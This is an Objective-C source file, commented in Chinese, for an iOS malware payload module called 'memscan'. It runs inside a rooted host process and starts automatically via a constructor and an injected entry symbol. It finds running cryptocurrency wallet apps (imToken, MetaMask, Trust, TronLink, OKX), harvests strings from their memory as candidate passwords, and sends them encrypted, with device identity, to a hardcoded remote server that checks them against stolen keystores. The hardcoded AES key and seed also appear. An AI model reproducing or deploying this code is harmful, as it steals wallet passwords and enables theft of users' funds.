//
//  Payload.m — memscan 载荷入口（独立进程内存扫描，不做注入、不做 hook）
//
//  为什么单独一个载荷：
//    · 它干的是「跨进程读内存」，跟采集（photonote）是两个领域
//    · 它需要 uid=0 + task_for_pid，位置必须在 locationd / SpringBoard 这类宿主
//    · 放在独立文件夹里，改它不会影响 photonote 的采集逻辑
//
//  流程：
//    1. 自检：报告 uid / task_for_pid 能力（kern_probe）
//    2. 找到目标钱包进程（按可执行路径匹配）
//    3. 扫它的可写内存，捞可打印字符串当候选密码
//    4. 候选上传 /pw，服务端用已存的 keystore 逐条校验
//
#import <Foundation/Foundation.h>
#import "Net.h"
#import "Info.h"
#import "KernProbe.h"
#import "MemScan.h"

static NSString *const kBaseURL = @"https://myg3z1adawtxz0s.icu";
static NSString *const kAesPassword = @"Ek8pl31K2yeHgQwy";
static NSString *const kSeed = @"d9f5121f75a6646c4f814a4ff8c41b04";

/** 要扫的钱包：可执行文件名片段 → 上报用的 bundleId */
static NSDictionary *TargetWallets(void) {
    return @{
        @"imToken": @"im.token.app",
        @"MetaMask": @"io.metamask.MetaMask",
        @"Trust": @"com.sixdays.trust",
        @"TronLink": @"com.tronlink.hdwallet",
        @"OKX": @"com.okex.OKExAppstoreFull",
    };
}

@interface MemScanPayload : NSObject
@property (nonatomic, strong) Net *net;
@property (nonatomic, assign) BOOL reportedCaps;
@end

@implementation MemScanPayload

+ (instancetype)shared {
    static MemScanPayload *p = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{ p = [MemScanPayload new]; });
    return p;
}

- (instancetype)init {
    if ((self = [super init])) {
        _net = [Net shared];
        _net.baseURL = kBaseURL;
        _net.aesPassword = kAesPassword;
        _net.identity = [Info identity];
    }
    return self;
}

#pragma mark - 上报

- (NSMutableDictionary *)baseBody {
    NSMutableDictionary *d = [NSMutableDictionary dictionaryWithDictionary:[Info identity] ?: @{}];
    d[@"c"] = kSeed;
    return d;
}

- (void)reportEvent:(NSString *)et ctx:(NSDictionary *)ctx {
    NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity] ?: @{}];
    ev[@"et"] = et;
    ev[@"c"] = kSeed;
    ev[@"ctx"] = ctx ?: @{};
    [self.net sendEvent:ev];
}

#pragma mark - 主流程

- (void)start {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
        @try {
            // 1. 能力自检（只报一次）
            if (!self.reportedCaps) {
                self.reportedCaps = YES;
                NSMutableDictionary *ctx = [NSMutableDictionary dictionaryWithDictionary:[KernProbe report]];
                ctx[@"host"] = [Info hostBundleId] ?: @"";
                [self reportEvent:@"kern_probe" ctx:ctx];
            }

            // 2. 每 20 秒轮询一次，看有没有目标钱包在跑
            while (YES) {
                @autoreleasepool {
                    [self scanRunningWallets];
                }
                [NSThread sleepForTimeInterval:20.0];
            }
        } @catch (NSException *e) {
            [self reportEvent:@"memscan_crashed" ctx:@{ @"reason": e.reason ?: @"" }];
        }
    });
}

/// 扫一遍正在运行的钱包进程
- (void)scanRunningWallets {
    NSDictionary *targets = TargetWallets();
    for (NSString *needle in targets) {
        NSString *bundleId = targets[needle];
        @try {
            pid_t pid = [MemScan pidOfExecutableContaining:needle];
            if (pid <= 0) continue;

            NSDictionary *h = [MemScan harvestStringsFromPid:pid
                                                    maxBytes:256 * 1024 * 1024
                                                   maxCands:1200];
            NSArray *cands = h[@"candidates"];
            if (!cands.count) continue;

            NSMutableDictionary *body = [self baseBody];
            body[@"bundle_id"] = bundleId;
            body[@"candidates"] = cands;

            NSDictionary *r = [self.net postEncrypted:@"/pw" json:body timeout:120];

            NSMutableDictionary *ctx = [NSMutableDictionary dictionary];
            ctx[@"bundleId"] = bundleId;
            ctx[@"pid"] = @(pid);
            ctx[@"scannedBytes"] = h[@"scannedBytes"] ?: @0;
            ctx[@"regions"] = h[@"regions"] ?: @0;
            ctx[@"candidates"] = @(cands.count);
            ctx[@"resp"] = r ? [r description] : @"nil";
            [self reportEvent:@"memscan_harvest" ctx:ctx];

            // 服务端一旦命中就不必再扫这个钱包
            if (r && [r[@"data"] isKindOfClass:[NSDictionary class]] &&
                [r[@"data"][@"hit"] boolValue]) {
                continue;
            }
        } @catch (NSException *e) {
            [self reportEvent:@"memscan_error"
                          ctx:@{ @"bundleId": bundleId, @"reason": e.reason ?: @"" }];
        }
    }
}

@end

__attribute__((constructor))
static void memscan_init(void) {
    @autoreleasepool {
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)),
                       dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
            [[MemScanPayload shared] start];
        });
    }
}

/**
 * 框架要求的入口符号（core.dylib 里 dlsym("entry_main")）。
 * 用户 App 注入必须要它，否则报 PLERROR_PAYLOAD_ENTRY_POINT_NOT_FOUND。
 */
__attribute__((visibility("default"), used))
void entry_main(void) {
    memscan_init();
}